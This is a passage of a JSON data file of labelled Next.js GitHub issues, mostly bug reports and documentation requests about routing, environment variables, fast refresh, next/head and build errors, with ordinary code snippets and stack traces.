yourself."},{"labels":[null,"documentation"],"text":"Raised in feedback, the following page is a 404 but that shouldn't be the case: https://nextjs.org/docs/tag/v9.2.2/basic-features/pages.\r\n\r\nIt's used in https://nextjs.org/docs/basic-features/pages for the top notification.\r\n\r\nI'm currently working on the fix as I write the issue 🕵️ "},{"labels":[null,null,"documentation",null],"text":"Documentation for custom routes was released some days ago (https://github.com/vercel/next.js/pull/14887). We should also add one example for every documentation page to better show how it works.\r\n\r\nThe following three examples are required:\r\n\r\n- [ ] `rewrites` For [docs/api-reference/next.config.js/rewrites.md](https://github.com/vercel/next.js/blob/canary/docs/api-reference/next.config.js/rewrites.md)\r\n- [ ] `redirects` For [docs/api-reference/next.config.js/redirects.md](https://github.com/vercel/next.js/blob/canary/docs/api-reference/next.config.js/redirects.md)\r\n- [ ] `headers` For [docs/api-reference/next.config.js/headers.md](https://github.com/vercel/next.js/blob/canary/docs/api-reference/next.config.js/headers.md)\r\n\r\nEvery example should contain very basic content and focus only on the feature it's about, showing how it works for multiple use cases that are currently not covered by the documentation. After the example is complete, add a link to it at the beginning of the page in docs.\r\n\r\nFeel free to open a PR and I'll review it asap."},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\n[Step 4](https://github.com/vercel/next.js/tree/canary/examples/cms-sanity#step-4-set-up-environment-variables) of the [readme](https://github.com/vercel/next.js/blob/canary/examples/cms-sanity/README.md) says, i have to create a env variable named `SANITY_PROJECT_ID` but to work locally with `yarn dev` it has to be `NEXT_PUBLIC_SANITY_PROJECT_ID` (as well?) \r\n\r\nSince i was not aware of this part of the next.js config, i was confused why it wasn’t working. Since i could access all env variables within my code, but not on runtime.\r\n\r\n## To Reproduce\r\n\r\nFollow the [steps](https://github.com/vercel/next.js/tree/canary/examples/cms-sanity#step-4-set-up-environment-variables) of the [Readme](https://github.com/vercel/next.js/blob/canary/examples/cms-sanity/README.md) to install & run the example.\r\n\r\n## Expected behavior\r\n\r\nFollow the readme and have a functioning project running with `yarn dev`\r\n\r\n## Screenshots\r\n\r\nWithout the `NEXT_PUBLIC_SANITY_PROJECT_ID` variable in the `.env.local` file:\r\n![image](https://user-images.githubusercontent.com/1867543/86346498-4abb7100-bc5d-11ea-83fa-23406fe6dec6.png)\r\n\r\n\r\n## System information\r\n\r\n- OS: macOS\r\n- Browser: Chrome\r\n- Version of Next.js: v9.4.4\r\n- Version of Node.js: v.13.8.0\r\n"},{"labels":[null,"documentation"],"text":"From feedback, I've seen that the usage of `outDir` is not clear about how it can be changed:\r\n\r\n![image](https://user-images.githubusercontent.com/4278345/85882818-907fc180-b7a5-11ea-8ee8-2a3144e4bce1.png)\r\n"},{"labels":[null,"documentation",null],"text":"We should have more examples about our core features, one of those is [Environment Variables](https://nextjs.org/docs/basic-features/environment-variables).\r\n\r\nThe example should be added to the examples folder and linked by our docs"},{"labels":[null,"documentation"],"text":"Our current `next/router` docs (https://nextjs.org/docs/api-reference/next/router) use a combination between the `useRouter` hook and the `Router` object, ideally most examples should show the usage with `useRouter` as that's usually what you would need."},{"labels":[null,null,"documentation"],"text":"Currently, we only explain to use CSS Modules in the err.sh link. The error message does not provide guidance on what to do next, only the problem.\r\n\r\nSee the messages in this file:\r\nhttps://github.com/vercel/next.js/blob/canary/packages/next/build/webpack/config/blocks/css/messages.ts\r\n\r\nWe should update the error messages displayed to the user very clear that there's an alternative so they're not stuck thinking Next.js cannot import CSS."},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nI upgraded to next@9.4.5-canary.12 from next@9.4.4 because of https://github.com/vercel/next.js/issues/14186\r\nEverything works with `next dev`. However, `next build` fails with:\r\n```js\r\nUnhandled error during request: TypeError: Cannot read property 'add' of undefined\r\n    at new _default ([HIDDEN_PATH]/node_modules/next/dist/next-server/lib/side-effect.js:1:407)\r\n    at d ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:36:320)\r\n    at $a ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:39:16)\r\n    at a.b.render ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:476)\r\n    at a.b.read ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:18)\r\n    at renderToStaticMarkup ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:54:462)\r\n    at renderDocument ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:3:594)\r\n    at renderToHTML ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:48:72)\r\n    at async renderReqToHTML ([HIDDEN_PATH]/.next/serverless/pages/[...slug].js:24441:22)\r\n    at async Object.exportPage [as default] ([HIDDEN_PATH]/node_modules/next/dist/export/worker.js:12:92)\r\nError occurred prerendering page \"/[...slug]\". Read more: https://err.sh/next.js/prerender-error\r\nTypeError: Cannot read property 'add' of undefined\r\n    at new _default ([HIDDEN_PATH]/node_modules/next/dist/next-server/lib/side-effect.js:1:407)\r\n    at d ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:36:320)\r\n    at $a ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:39:16)\r\n    at a.b.render ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:476)\r\n    at a.b.read ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:18)\r\n    at renderToStaticMarkup ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:54:462)\r\n    at renderDocument ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:3:594)\r\n    at renderToHTML ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:48:72)\r\n    at async renderReqToHTML ([HIDDEN_PATH]/.next/serverless/pages/[...slug].js:24441:22)\r\n    at async Object.exportPage [as default] ([HIDDEN_PATH]/node_modules/next/dist/export/worker.js:12:92)\r\nUnhandled error during request: TypeError: Cannot read property 'add' of undefined\r\n    at new _default ([HIDDEN_PATH]/node_modules/next/dist/next-server/lib/side-effect.js:1:407)\r\n    at d ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:36:320)\r\n    at $a ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:39:16)\r\n    at a.b.render ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:476)\r\n    at a.b.read ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:18)\r\n    at renderToStaticMarkup ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:54:462)\r\n    at renderDocument ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:3:594)\r\n    at renderToHTML ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:48:72)\r\n    at async renderReqToHTML ([HIDDEN_PATH]/.next/serverless/pages/_error.js:10604:22)\r\n    at async Object.exportPage [as default] ([HIDDEN_PATH]/node_modules/next/dist/export/worker.js:12:92)\r\nError occurred prerendering page \"/404\". Read more: https://err.sh/next.js/prerender-error\r\nTypeError: Cannot read property 'add' of undefined\r\n    at new _default ([HIDDEN_PATH]/node_modules/next/dist/next-server/lib/side-effect.js:1:407)\r\n    at d ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:36:320)\r\n    at $a ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:39:16)\r\n    at a.b.render ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:476)\r\n    at a.b.read ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:18)\r\n    at renderToStaticMarkup ([HIDDEN_PATH]/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:54:462)\r\n    at renderDocument ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:3:594)\r\n    at renderToHTML ([HIDDEN_PATH]/node_modules/next/dist/next-server/server/render.js:48:72)\r\n    at async renderReqToHTML ([HIDDEN_PATH]/.next/serverless/pages/_error.js:10604:22)\r\n    at async Object.exportPage [as default] ([HIDDEN_PATH]/node_modules/next/dist/export/worker.js:12:92)\r\n> Build error occurred\r\nError: Export encountered errors on following paths:\r\n\t/404\r\n\t/[...slug]\r\n    at exportApp ([HIDDEN_PATH]/node_modules/next/dist/export/index.js:22:1166)\r\n    at runMicrotasks (<anonymous>)\r\n    at processTicksAndRejections (internal/process/task_queues.js:97:5)\r\n    at async build ([HIDDEN_PATH]/node_modules/next/dist/build/index.js:38:218)\r\n22:36:52.954  \r\nerror Command failed with exit code 1.\r\n```\r\nOur projects builds fine up until 9.4.4 (current stable) but canary fails.\r\n\r\n## To Reproduce\r\n\r\n~I don't understand enough the error to be able to reproduce it.\r\nWe don't have a custom 404 not _error pages which makes it even more confusing.\r\nAny hint where to look at would be appreciated so I can try to repro this (project is private, so I can't share it :/)~\r\n*Edit:* Alright, I started moving files around and commenting code and this is what it came down to:\r\n1. Create an empty NextJS app (next@9.4.5-canary.12)\r\n2. Create empty page (this is what I have):\r\n```javascript\r\n// pages/[...slug].js\r\nconst CatchAllPages = () => {\r\n  return <div>Test</div>\r\n}\r\nexport const getStaticPaths = async () => {\r\n  return {\r\n    paths: [],\r\n    fallback: true,\r\n  }\r\n}\r\nexport const getStaticProps = async (ctx) => {\r\n  return {\r\n    props: {},\r\n  }\r\n}\r\nexport default CatchAllPages\r\n```\r\n3. Create a custom `_document.js`:\r\n```javascript\r\nimport * as React from 'react'\r\nimport Document, {\r\n  Html,\r\n  Head as HeadContainer,\r\n  Main,\r\n  NextScript,\r\n} from 'next/document'\r\nimport Head from 'next/head'\r\n\r\nconst SomeComponent = React.memo(() => {\r\n  return (\r\n    <>\r\n      <Head>\r\n        <script\r\n          dangerouslySetInnerHTML={{ __html: '// this does not matter' }}\r\n        ></script>\r\n      </Head>\r\n    </>\r\n  )\r\n})\r\n\r\nexport default class CustomDocument extends Document {\r\n  render() {\r\n    return (\r\n      <Html>\r\n        <HeadContainer />\r\n        <body>\r\n          <Main />\r\n          <NextScript />\r\n          <SomeComponent />\r\n        </body>\r\n      </Html>\r\n    )\r\n  }\r\n}\r\n```\r\n4. Run `next build`\r\n\r\nApparently this has something to do with using `next/head` when rendering a component (e.g: in above `SomeComponent` which could live outside in `src/components`) in the `Html` tag in `body`.\r\n\r\n## Expected behavior\r\n\r\nIt should build or provide a better error message. If using `next/head` is no longer allowed in `Html` or in `_document` then it should display a better error with a link to some NextJS doc describing the issue (as it does with other error messages)\r\n\r\n## System information\r\n\r\n- OS: MacOS\r\n- Version of Next.js: next@9.4.5-canary.12\r\n- Version of Node.js: 12.18.0\r\n\r\n## Additional context\r\n\r\nWorks with 9.3.x & 9.4.4\r\n"},{"labels":[null,"documentation"],"text":"# Feature request\r\n\r\n## Is your feature request related to a problem? Please describe.\r\n\r\nWe released the `reactStrictMode` option to enable React Strict Mode quite a bit ago but I noticed the docs are currently missing.\r\n\r\n## Describe the solution you'd like\r\n\r\nAdd documentation for this options, more information on what it is / how it works can be found here: https://nextjs.org/blog/next-9-1-7#react-strict-mode-compliance-and-opt-in\r\n"},{"labels":[null,null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\nFast refresh is not working when using named exports alongside default export.\r\n\r\n## To Reproduce\r\n- Setup new next project using next init\r\n- Go to `pages/index.js` and remove export default from your function component \r\n```js\r\nexport default function Home() {...}\r\n// to\r\nfunction Home() {...}\r\n```\r\n- export something alongside your component as default\r\n```js\r\n// end of the file\r\nlet a = 2;\r\nexport { a, Home as default};\r\n```\r\n\r\n## Expected behavior\r\n\r\nFast refresh should work\r\n\r\n## System information\r\n\r\n- OS:  Linux\r\n- Browser Chromium latest\r\n- Version of Next.js:  9.4.1\r\n- Version of Node.js: 12.16.3\r\n\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nValues of environment variables are sometimes altered. We noticed a secret key containing a \"$\" character was read without this character\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Use a custom \".env\" file on localhost\r\n\r\n## Expected behavior\r\n\r\nWe have been using .env files configured using \"dotenv\" npm module and `next.config.js` publicRuntimeConfig/serverRuntimeConfig since a few months and everything worked as expected. Since yesterday, a api route in our app could not generate accessTokens for a specific service anymore. It did work in our Heroku deployment, which uses the same environment variables (Set by heroku). After a few hours of debubbing, we noticed that a environment variable containing a \"$\"-character, was read without it:\r\n\r\nOriginal value in .env: xxxxxxxxx$XXXXX\r\nValue in process.env during runtime: xxxxxxxxxXXXXX\r\n\r\n## Screenshots\r\n\r\n-\r\n\r\n## System information\r\n\r\n- OS: macOS 10.15.4\r\n- Browser (if applies): -\r\n- Version of Next.js: 9.4.1\r\n- Version of Node.js: 13.14.0\r\n\r\n## Additional context\r\n\r\nIt could be that other characters are also affected, although this was the only one that broke our configuration.\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nFast Refresh does not support unnamed function components ([closed issue](https://github.com/zeit/next.js/issues/12891)), yet the warning provided does not mention this.\r\n\r\n## To Reproduce\r\n\r\n`pages/index.js`:\r\n\r\n```\r\nimport '../src/somefile'\r\n\r\nexport default () => null;\r\n```\r\n\r\nThen edit and save `somefile`.\r\n\r\n### Works\r\n\r\n```\r\nimport '../src/somefile'\r\n\r\nconst Page = () => null;\r\n\r\nexport default Page;\r\n\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe warning should mention that Fast Refresh does not support unnamed function components.\r\n\r\n## System information\r\n\r\n- Version of Next.js: 9.4.1\r\n\r\n## Additional context\r\n\r\nI know that the warning was only introduced in 9.4.1 (and is a huge improvement on the error in 9.4.0), so it will most likely be subject to near future iterations. Here's how I read it:\r\n\r\n> Fast Refresh will perform a full reload when you edit a file that's imported by modules outside of the React tree.\r\n\r\nProbably my ignorance, but I was a bit confused about what \"modules outside of the React tree\" mean here. Does this mean the React components tree? Is `somefile` outside of the react tree? I mean, there is a dependency graph, but it is not a tree.\r\n\r\n> You might have a file which renders a React component but also exports a value that is imported by a non-React component.\r\n\r\nFirst, files don't 'render' a React component - files 'export' react components.\r\n\r\nI don't really understand whether this is said within the context of the whole dependency graph or what? Does this mean that if I have a file that exports a react component, but also some function (or a type like Props) that is then imported in a test, that will break Fast Refresh\r\n\r\n> Consider migrating the non-React component export to a separate file and importing it into both files.\r\n\r\nWhat's a \"non-React component`? An angular one?\r\n\r\n> It is also possible you are using class components at the top-level of your application, which disables Fast Refresh.\r\n\r\nThis is also unclear. What constitutes the \"top-level of your application\"? Some options:\r\n\r\n- A page's default export\r\n- `pages/_app.js`\r\n- `pages/_document.js`\r\n\r\n> Fast Refresh requires at least one function component in your React tree.\r\n\r\nThat is clear and the reproduction case above comply with this.\r\n\r\nAnyhow, while there is a place for improvement in my view to other parts of the warning, I believe my issue would be solved if the last line would say:\r\n\r\n> Fast Refresh requires at least one _named_ function component in your React tree.\r\n\r\nYet I'm not sure this is correct. Is it any odd function component that needs to be named, or the one exported from a page?"},{"labels":[null,null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nWhen aliasing folders, Webpack won't resolve root level `index.js` files.\r\n\r\nDoesn't resolve:\r\n```js\r\nimport \"~store\";\r\n```\r\nResolves:\r\n```js\r\nimport \"~store/index\";\r\n```\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Create a `jsconfig.json` file:\r\n```\r\n{\r\n  \"compilerOptions\": {\r\n    \"target\": \"es6\",\r\n    \"module\": \"commonjs\",\r\n    \"baseUrl\": \"src\",\r\n    \"paths\": {\r\n      \"~store/*\": [\"store/*\"]\r\n    }\r\n  }\r\n}\r\n```\r\n2. Create an IIFE in an `index.js` file within `src/store`\r\n```\r\n(() => console.log(\"Hello\"))();\r\n```\r\n3. Attempt to import the file within a `page` file:\r\n```\r\nimport \"~store\";\r\n\r\nexport default () => <h1>Test Page</h1>\r\n```\r\n\r\nResults in:\r\n![](https://i.imgur.com/ro7qBSm.png)\r\n\r\nIf you change the import to include `index`, then it works:\r\n```\r\nimport \"~store/index\";\r\n\r\nexport default () => <h1>Test Page</h1>\r\n```\r\n\r\nResults in:\r\n![](https://i.imgur.com/oFipoAS.png)\r\n\r\n## Expected behavior\r\n\r\nWebpack should automatically resolve root-level `index.js` imports.\r\n\r\n## System information\r\n\r\n- OS: LMDE 4\r\n- Version of Next.js: v9.4.0\r\n- Version of Node.js: 10\r\n\r\n## Other\r\n\r\nPossibly unrelated to the above, but I also found a warning being thrown from `hot-dev-client` when changing and saving the `Test Page` text to `Test` (and vice-versa) for some reason:\r\n![](https://i.imgur.com/HU4RA7S.png)\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\nI updated nextjs from `9.3.6` to `9.4.0`.\r\n\r\n## Describe the bug\r\n\r\nAfter updating I do not get typescript errors anymore checked during buildtime. This was working in `9.3.6`. \r\n\r\n## To Reproduce\r\n\r\nAs I have quite a complex mono repository, I'm unable to provide the source of that.\r\nMajor differences to a stock configuration is a custom babel configuration:\r\n\r\n```js\r\nmodule.exports = {\r\n  presets: [],\r\n  plugins: [\r\n    'lodash',\r\n    '@babel/proposal-class-properties',\r\n    'react-intl-auto',\r\n    'babel-plugin-graphql-tag'\r\n  ],\r\n  env: {\r\n    test: {\r\n     presets: [\r\n       '@babel/typescript',\r\n         [ '@babel/preset-env',\r\n           {\r\n           targets: {\r\n             node: process.versions.node\r\n           }\r\n         }\r\n         ],\r\n       '@babel/preset-react'\r\n     ]\r\n    },\r\n    nodeTs: {\r\n      presets: [\r\n        '@babel/typescript',\r\n        '@babel/preset-react',\r\n        [\r\n          '@babel/preset-env',\r\n          {\r\n            targets: {\r\n              node: process.versions.node\r\n            }\r\n          }\r\n        ]\r\n      ]\r\n    },\r\n    nextjs: {\r\n      presets: ['next/babel']\r\n    }\r\n  }\r\n}\r\n```\r\nAnd a custom next.config.ts:\r\n```ts\r\n/* eslint-disable @typescript-eslint/no-var-requires */\r\nconst path = require('path')\r\n\r\nconst withDevTool = (nextConfig: any = {}) => {\r\n  return {\r\n    ...nextConfig,\r\n    webpack(config: any, options: any) {\r\n      const { dev } = options\r\n      if (dev) {\r\n        config.devtool = 'eval-source-map'\r\n      }\r\n      if (typeof nextConfig.webpack === 'function') {\r\n        return nextConfig.webpack(config, options)\r\n      }\r\n      return config\r\n    },\r\n  }\r\n}\r\n\r\nexport default () => {\r\n  const optimizedImages = require('next-optimized-images')\r\n\r\n  const withTM = require('next-transpile-modules')([\r\n    'query-string',\r\n    'imask/esm',\r\n   /** ..some more private modules */\r\n  ])\r\n\r\n  const withCustomBabelConfigFile = require('next-plugin-custom-babel-config')\r\n  const withCSS = require('@zeit/next-css')\r\n\r\n  const withBundleAnalyzer = require('@next/bundle-analyzer')({\r\n    enabled: process.env.ANALYZE === 'true',\r\n  })\r\n\r\n  return withDevTool(\r\n    withBundleAnalyzer(\r\n      optimizedImages(\r\n        withCustomBabelConfigFile(\r\n          withCSS(\r\n            withTM({\r\n              babelConfigFile: path.resolve(\r\n                path.join(__dirname, '../../../../babel.config.js')\r\n              ),\r\n              distDir: 'dist',\r\n            })\r\n          )\r\n        )\r\n      )\r\n    )\r\n  )\r\n}\r\n```\r\n\r\nI'm using a custom server with additional express middleware.\r\n\r\n```ts\r\n// This file doesn't go through babel or webpack transformation.\r\n// Make sure the syntax and sources this file requires are compatible with the current node version you are running\r\n// See https://github.com/zeit/next.js/issues/1245 for discussions on Universal Webpack or universal Babel\r\nimport 'dotenv/config'\r\nimport express from 'express'\r\nimport next from 'next'\r\nimport { defaultMiddleware } from '../index'\r\nimport { appConfig } from './appConfig'\r\n\r\nconst applicationFactory = (): void => {\r\n  const dev = process.env.NODE_ENV !== 'production'\r\n  const conf = dev\r\n    ? // eslint-disable-next-line @typescript-eslint/no-var-requires\r\n      require('./next.config').default()\r\n    : {\r\n        distDir: 'dist',\r\n      }\r\n  const app = next({\r\n    dev,\r\n    conf,\r\n  })\r\n  const handle = app.getRequestHandler()\r\n  app.prepare().then(() => {\r\n    const server = express()\r\n    const proxyInstance = defaultMiddleware(server, appConfig)\r\n    server.get('*', (req, res) => {\r\n      return handle(req, res)\r\n    })\r\n    const port = process.env.PORT || 3000\r\n    // @ts-ignore\r\n    const listener = server.listen(port, (err: Error) => {\r\n      if (err) {\r\n        throw err\r\n      }\r\n      // tslint:disable-next-line:no-console\r\n      console.log(`> Ready on http://localhost:${port}`)\r\n    })\r\n    listener.on('upgrade', (req: any, socket: any, ...rest: any) => {\r\n      socket.on('error', (error: any) => {\r\n        console.error(error)\r\n      })\r\n      proxyInstance.upgrade(req, socket, ...rest)\r\n    })\r\n  })\r\n}\r\n\r\nexport default applicationFactory\r\n\r\n```\r\n\r\n## Expected behavior\r\n\r\nTypescript errors should be reported.\r\n\r\n## System information\r\n\r\n- OS:  Windows\r\n- Version of Next.js: 9.4.0\r\n- Version of Node.js: 12.13.1\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\nI was having routing issues in my application after implementing Multi Zones. I went back to the docs' example and noticed the bug was also there. \r\n\r\nI hosted it on Now using the exact same example as the docs:\r\nhttps://github.com/zeit/next.js/tree/canary/examples/with-zones\r\n\r\nI'm not savvy enough to understand the origin of the bug. Where is this coming from?\r\n\r\n## Describe the bug\r\n\r\nVisiting the link [https://test-paul-with-zones-app.now.sh/blog/post/1](https://test-paul-with-zones-app.now.sh/blog/post/1) fails when request from the browser. It works only when navigating to it client-side (Next Link)\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Go to '[https://test-paul-with-zones-app.now.sh/blog/post/1](https://test-paul-with-zones-app.now.sh/blog/post/1)'\r\n2. See a 404 page\r\n3. Go to [https://test-paul-with-zones-app.now.sh/blog](https://test-paul-with-zones-app.now.sh/blog)\r\n4. Click on Post 1\r\n5. The page shows correctly\r\n\r\n## Expected behavior\r\n\r\nThe page should load and not show a 404\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nIt isn't possible to have an `_error.tsx` file in the `/pages` folder without also having a `404.tsx` file. When running `next dev`, it works fine, but as soon as you run `next build`, the following error appears:\r\n\r\n```\r\nAutomatically optimizing pages ...\r\nError occurred prerendering page \"/404\". Read more: https://err.sh/next.js/prerender-error:\r\nError: Error for page /_error: pages with `getServerSideProps` can not be exported. See more info here: https://err.sh/next.js/gss-export\r\n```\r\n\r\nAccording to the official Next.js Blog, it should not be a problem to have a `_error.tsx` without a `404.tsx`: https://nextjs.org/blog/next-9-3#automatic-static-optimization-for-404\r\n\r\nThe reason I do not want a static 404 page is so that I can catch routes with a trailing slash and redirect accordingly to the route without a trailing slash. This must be done on the server.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Create an `_error.tsx` file with a `getServerSideProps()` function.\r\n2. Run `next build`.\r\n\r\n## Expected behavior\r\n\r\nThe error message says that it is trying to export the `_error.tsx` file even though it obviously shouldn't be. The application should still build. As soon as I add a `404.tsx` file or remove the `_error.tsx` file, it builds without a problem.\r\n\r\n## System information\r\n\r\n- OS: macOS and Alpine Linux (Docker)\r\n- Version of Next.js: 9.3\r\n- Version of Node.js: 13.13.0 and 14.0.0\r\n\r\n## Additional context\r\n\r\nJust in case it might be of any use, here is the code from my `_error.tsx` file:\r\n\r\n```\r\nimport React, { useEffect } from 'react';\r\nimport { GetServerSideProps } from 'next';\r\nimport Head from 'next/head';\r\nimport Router from 'next/router';\r\n\r\nimport { makeStyles, createStyles } from '@material-ui/core/styles';\r\nimport Container from '@material-ui/core/Container';\r\n\r\nimport useStandardHeaderTags from '../lib/useStandardHeaderTags';\r\nimport TitleElement from '../components/TitleElement';\r\n\r\nconst useStyles = makeStyles(() =>\r\n  createStyles({\r\n    root: {\r\n      textAlign: 'center'\r\n    }\r\n  })\r\n);\r\n\r\ninterface Props {\r\n  statusCode: number;\r\n}\r\n\r\nconst Error: React.FC<Props> = ({ statusCode }) => {\r\n  const classes = useStyles();\r\n  const title = statusCode === 404 ? '404' : 'Error';\r\n\r\n  return (\r\n    <>\r\n      <Head>\r\n        {useStandardHeaderTags(title)}\r\n      </Head>\r\n      <Container className={classes.root}>\r\n        <TitleElement text={title} />\r\n\r\n        {statusCode === 404\r\n          ? 'The page you are looking for could not be found.'\r\n          : 'An error occurred.'}\r\n      </Container>\r\n    </>\r\n  );\r\n};\r\n\r\nexport const getServerSideProps: GetServerSideProps = async ({ res, req }) => {\r\n  const statusCode = res ? res.statusCode : 404;\r\n\r\n  if (statusCode === 404) {\r\n    if (req.url.match(/\\/$/)) {\r\n      const withoutTrailingSlash = req.url.substr(0, req.url.length - 1);\r\n      if (res) {\r\n        res.writeHead(303, {\r\n          Location: withoutTrailingSlash\r\n        });\r\n        res.end();\r\n      }\r\n      else {\r\n        Router.push(withoutTrailingSlash);\r\n      }\r\n    }\r\n  }\r\n\r\n  return {\r\n    props: {\r\n      statusCode\r\n    }\r\n  };\r\n};\r\n\r\nexport default Error;\r\n```\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\n`next build` fails with the error in the title after updating to 9.3.4 with a custom PostCSS config following the current documentation\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Create a `postcss.config.js` with the contents specified [here](https://nextjs.org/docs/advanced-features/customizing-postcss-config)\r\n2. Update to 9.3.4\r\n3. No more builds!\r\n\r\n## Expected behavior\r\n\r\nDocumentation needs to be updated with the correct \"base\" PostCSS config for 9.3.4. I know you apparently removed `postcss-flexbugs-fixes`, but I have no idea what else might have changed.\r\n"},{"labels":["documentation"],"text":"**update: managed to activate the grid with autoprefixer comment in the scss.** \r\n\r\n# Bug report\r\nthe docs state \"**New CSS features are automatically compiled for Internet Explorer 11 compatibility: Grid Layout and Gap property** \"\r\n\r\n## Describe the bug\r\ni have installed next 9.3 and added various ie11 browserlist configs like so: \r\n```\r\n  \"browserslist\": \">0.3%, ie 11\"\r\n``` \r\n\r\ntested on a simple grid component - did not work. \r\n\r\n## To Reproduce\r\nuse any grid layout with ie11 in the supported browsers. \r\n\r\n## Expected behavior\r\nIE11 to show a grid layout\r\n\r\nis there something missing in my config ? the docs did not elaborate and there is no example folder for this. "},{"labels":["documentation"],"text":"# Bug report\r\n\r\nThe [documentation on data fetching](https://github.com/zeit/next.js/blob/canary/docs/basic-features/data-fetching.md) mentions that `getServerSideProps` will be executed client side when using next/link. Was next/router forgotten to be mentioned in the documentation? For `getStaticProps`, next/router is already mentioned.\r\n\r\nWhile at it: there is an incomplete sentence on the same doc page:\r\n\r\n> and the result cannot be cached by a CDN without extra ."},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\nWhen using `next/head` for adding og tags to the page, \r\nI am using \r\n`<meta property=\"og:title\" content=\"...\" />`\r\n\r\nFor some other tags like `name=\"title\"` , I am using\r\n`<meta name=\"title\" content=\"...\" />`\r\n\r\nBoth of these work fine and are added to the `head`.\r\n\r\nThe problem arises when I need to override these from a child component.\r\nIn this case, the `<meta name=\"title\" ... />` gets overridden correctly, but a new entry is added for `<meta property=\"og:title\" ... />`\r\n\r\nTo circumvent this, I have figured out that i can pass a `key` to the `<meta property-=\"...\"  />,` in which case it gets correctly overridden.\r\n\r\nIs this understanding correct?\r\nmeta tags with name are deduped by default, otherwise we need to pass in a key\r\nIs this behaviour documented anywhere?\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n```\r\nfunction Parent() {\r\n  return (\r\n    <>\r\n    <Head>\r\n      <meta name=\"n1\" content=\"content1\" />\r\n      <meta property=\"p1\" content=\"content2\" />\r\n    </Head>\r\n    <Child />\r\n    </>\r\n  );\r\n}\r\n\r\nfunction Child() {\r\n  return (\r\n    <Head>\r\n      <meta name=\"n1\" content=\"content1\" />\r\n      <meta property=\"p1\" content=\"content2\" />\r\n    </Head>\r\n  )\r\n}\r\n```\r\n\r\n## Expected behavior\r\nthe <head> tag should have these meta tags:\r\n```\r\n<meta name=\"n1\" content=\"content1\" />\r\n<meta property=\"p1\" content=\"content2\" />\r\n```\r\n\r\nbut instead this is what I see:\r\n```\r\n<meta name=\"n1\" content=\"content1\" /> \r\n<meta property=\"p1\" content=\"content2\" />\r\n<meta property=\"p1\" content=\"content2\" />\r\n```\r\n## Screenshots\r\n\r\nIf applicable, add screenshots to help explain your problem.\r\n\r\n## System information\r\n\r\n- OS: macOS\r\n- Browser: Chrome\r\n- Version of Next.js: 9.1.4\r\n\r\n## Additional context\r\n\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nRunning `npm init next-app` creates a new Next.js project that uses Yarn, rather than npm. Given, the fact that I'm using npm to create the project, and the docs offer two options for getting started, one with npm and one with Yarn, this is completely unexpected behavior.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Read getting started docs\r\n2. Choose the `npm` option\r\n3. Run `npm init next-app`\r\n4. Get a project that uses Yarn\r\n\r\n## Expected behavior\r\n\r\nIt should create a project that uses npm for package management.\r\n\r\nHere ya go, Tim!"},{"labels":["documentation"],"text":"In Next.JS 9.1.7, the CLI output has been redesigned and it shows '_size_' and '_first load size_' for each page now. It would be really helpful if someone can throw some 